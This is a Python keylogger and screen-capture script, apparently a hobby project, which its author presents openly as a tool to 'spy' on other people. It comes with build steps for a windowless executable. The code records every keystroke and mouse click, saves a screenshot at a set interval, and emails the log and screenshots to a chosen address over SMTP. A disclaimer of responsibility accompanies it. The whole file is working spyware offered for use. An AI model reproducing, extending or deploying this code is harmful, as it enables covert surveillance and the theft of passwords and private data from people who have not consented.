#
#    _____              ____      _________
#   |  --  \           /   /     |  ____   \
#   | |  |  |         /   /      | |    |   \
#   |  --  /         /   /       | |    |   |
#   |     \         /   /        | |    |   |
#   |  |\  \       /   /         | |    |  /
#   |  | \  \     /   /          |  ----  /
#   ---   ---    /___/           |_______/
#
#             Recording script
#
#Developed by WeDonHaveAName studios, a script that allows you to "spy" on other peoples things.
#I made it in my spare time, for no apparent reason. Just so you know, this is not some top-end tech, just some intermediate python code.
#Therefore, do not expect for it to be too good.
# To set up:
#1. Install pyinstaller: pip install pyinstaller
#2. Use it to export: pyinstaller --onefile --noconsole sourceCode/Console.py
#3. Run executable: It should create a .txt called user_input_log. This will have what they typed, and when and where they clicked.
#4. Checking: On top of that, you should have a new folder next to it called "screenshots". Every 5 secconds, it will make a screenshot of that perosn screen.
#5. Using: Have fun! Do whatever you want with it. I am not held accountable for what you use it for. To run, you just have to open the executable.
# If you have any suggesitons, tell me on Github! (Tobs11)


# from cryptography.fernet import Fernet
#
# # Generate a key (do this once and save it securely)
# key = Fernet.generate_key()
# cipher = Fernet(key)
#
# # Encrypt data
# encrypted_data = cipher.encrypt(compiled_text.encode())
#
# # Decrypt data (when needed)
# decrypted_data = cipher.decrypt(encrypted_data).decode()
#Import modules used in the script
import keyboard
import platform
import time
from datetime import datetime
import os
from PIL import ImageGrab  # For taking screenshots
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import mouse  # For capturing mouse clicks
#Wipe file before use, also creates file if it is not there.
with open("user_input_log.txt", "w") as file:
    file.truncate(0)


import json

with open("config.json", "r") as config_file:
    config = json.load(config_file)

sender_email = config["email"]["sender"]
receiver_email = config["email"]["receiver"]
password = config["email"]["password"]
screenshot_timing = config["screenshot_interval"]


#Sends email to where you specify. Requires email account and password to run, so you might not want to use it. (Optional)
def send_email(start_time, end_time, compiled_text, dated_folder_path):
    # Email configuration
    sender_email = "yourEmail@gmail.com"  # Replace with your email
    receiver_email = "recipientEmail@gmail.com"  # Replace with the recipient's email
    password = "yourPassword"  # Replace with your email password

    # Email content
    subject = f"User Input Log: {start_time} to {end_time}"
    body = f"Recording started at: {start_time}\nRecording ended at: {end_time}\n\nRecorded Data:\n{compiled_text}"

    # Create the email
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message.attach(MIMEText(body, "plain"))

    # Attach screenshots from the dated folder
    for filename in os.listdir(dated_folder_path):
        file_path = os.path.join(dated_folder_path, filename)
        if filename.endswith(".png"):  # Attach only screenshots
            with open(file_path, "rb") as attachment:
                part = MIMEText(attachment.read(), "base64", "utf-8")
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename={filename}",
                )
                message.attach(part)

    # Send the email
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:  # Replace with your email provider's SMTP server
            server.starttls()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")


#Takes and sends a screenshot to the 'screenshots' folder. Has the timestamp in its name for easier handling.
import platform  # For getting the computer's name

def take_screenshot(base_folder_path):
    """Take a screenshot and save it to a folder structure: ComputerName/Date/."""
    # Get the computer's name
    computer_name = platform.node()

    # Create a folder with the computer's name
    computer_folder_path = os.path.join(base_folder_path, computer_name)
    os.makedirs(computer_folder_path, exist_ok=True)

    # Create a folder with the current date inside the computer's folder
    date_folder = datetime.now().strftime("%Y-%m-%d")
    dated_folder_path = os.path.join(computer_folder_path, date_folder)
    os.makedirs(dated_folder_path, exist_ok=True)

    # Save the screenshot in the dated folder
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    screenshot_path = os.path.join(dated_folder_path, f"screenshot_{timestamp}.png")
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)
    print(f"Screenshot saved: {screenshot_path}")

    return dated_folder_path  # Return the folder path for saving the log

def main():
    print("Recording started. Press 'ESC' to stop.")
    compiled_text = ""
    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    start_time_raw = time.time()
    screenshot_timer = time.time()

    # Create the base screenshots folder if it doesn't exist
    screenshots_folder = "People"
    os.makedirs(screenshots_folder, exist_ok=True)

    # Initialize dated_folder_path to avoid UnboundLocalError
    dated_folder_path = take_screenshot(screenshots_folder)

    # Function to handle mouse clicks
    def on_click(x, y, button, pressed):
        nonlocal compiled_text
        if pressed:  # Record only when the mouse button is pressed
            timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
            compiled_text += f"\nMouse clicked at ({x}, {y}) with {button} at {timestamp}\n"

    # Start listening to mouse events
    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()

    # Main recording
    try:
        while True:
            # Check for keyboard events without suppressing
            if keyboard.is_pressed("esc"):
                break

            event = keyboard.read_event(suppress=False)  # Allow typing in the background
            if event.event_type == keyboard.KEY_DOWN:
                key = event.name

                # Handle special keys
                if key == "space":
                    compiled_text += " "
                elif key == "enter":
                    compiled_text += "\n"
                elif key == "backspace":
                    compiled_text = compiled_text[:-1]
                elif len(key) == 1:  # Regular stuff
                    compiled_text += key

                # Add timestamp every minute (You can change it)
                elapsed_time = time.time() - start_time_raw
                if elapsed_time >= 60:
                    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
                    compiled_text += f"\nTime: {timestamp}\n"
                    start_time_raw = time.time()

                # Take a screenshot every 60 seconds
                if time.time() - screenshot_timer >= screenshot_timing:
                    dated_folder_path = take_screenshot(screenshots_folder)
                    screenshot_timer = time.time()

    except KeyboardInterrupt:
        pass
    finally:
        # Stop the mouse listener
        mouse_listener.stop()

    # Used later
    end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Save the compiled text to a file in the dated folder
    log_file_path = os.path.join(dated_folder_path, "user_input_log.txt")
    with open(log_file_path, "w") as file:
        file.write(compiled_text)

    print(f"Recording stopped. User input saved to '{log_file_path}'.")

    # Send the email with the recorded data and screenshots
    send_email(start_time, end_time, compiled_text, dated_folder_path)

# Start.
if __name__ == "__main__":
    main()